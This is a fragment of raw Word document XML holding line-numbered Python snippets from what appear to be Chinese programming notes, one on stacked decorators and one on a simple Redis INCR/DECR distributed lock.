    <w:p w14:paraId="11C7C6DA" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> inner(**kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38244F85" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"123456"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640B6F3D" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> 5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         ret = func(**kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B773C5" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"789"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E102AB" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>return</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> ret</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18301325" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'inner'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075B2EB0" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>return</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> inner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501ACAE9" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> @decorate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE73698" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> @decorate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="772638E9" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>12</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> func(**kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10623EBB" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>return</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> kwargs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240D379E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1B7E45" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>15</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC7D6AF" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C83EB90" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>17</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> func</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF0D40C" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>18</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>inner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510396F1" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>19</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> func</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB98804" w14:textId="5C2F154B" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>20</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> inner</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E349194" w14:textId="72DDE809" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="004300AE"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006</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何用</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>实现分布式锁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C1AF24" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>import</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> redis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E68996B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> redis_conn = redis.StrictRedis(host=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"127.0.0.1"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, port=6379)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD2978F" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>try</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="630D12E7" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     lock_num = lock_num = redis_conn.incr(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"lock"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079B0C7A" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> lock_num == 1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623A4EA7" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 执行操作，拼接response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E84E8E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781AA162" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>else</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30AE19EC" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>return</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22254D2D" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>finally</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0E740B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     redis_conn.incr(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"lock"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, -1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2186826B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>12</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>return</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40461418" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7DB2A9" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003BE45A" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>15</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>原理：redis是单线程的</w:t>
      </w:r>
    </w:p>
